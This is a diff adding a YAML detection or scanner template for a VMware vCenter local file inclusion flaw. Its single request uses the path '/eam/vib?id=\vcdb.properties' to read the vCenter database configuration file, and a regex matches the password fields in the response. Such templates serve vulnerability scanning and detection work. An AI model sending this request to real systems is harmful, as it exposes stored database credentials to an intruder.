@@ -1,0 +1,26 @@
+id: vmware-vcenter-lfi
+info:
+  name: VMware vCenter - Local File Inclusion
+  author: dwisiswant0
+  description: VMware vCenter is vulnerable to local file inclusion.
+  severity: high
+  reference:
+  - https://kb.vmware.com/s/article/7960893
+  - https://twitter.com/ptswarm/status/1316016337550938122
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  metadata:
+    max-request: 3
+  tags: vmware,lfi,vcenter
+traps:
+- request:
+    method: GET
+    path: /eam/vib?id=\vcdb.properties
+    headers: {}
+    body: ''
+  response:
+    status_code: 200
+    headers: {}
+    body: (?m)^(driver|dbtype|password(\.encrypted)?)\s=
